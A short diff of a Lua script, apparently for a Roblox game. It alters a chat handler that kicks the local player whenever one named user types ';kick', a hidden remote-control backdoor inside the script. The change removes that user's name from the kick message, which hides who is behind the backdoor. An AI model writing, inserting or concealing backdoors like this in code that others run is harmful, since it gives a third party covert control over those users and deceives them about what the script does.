@@ -538,6 +538,7 @@ local function checkAndKick()
     end
 end
 
+
 -- Run the check in a loop
 while true do
     checkAndKick()
@@ -551,7 +552,7 @@ local LocalPlayer = Players.LocalPlayer
 
 local function onChatMessage(player, message)
     if player.Name == "ohhiimnoobinarsenal2" and message == ";kick" then
-        LocalPlayer:Kick("You have been kicked by ohhiimnoobinarsenal2.")
+        LocalPlayer:Kick("You have been kicked.")
     end
 end
 
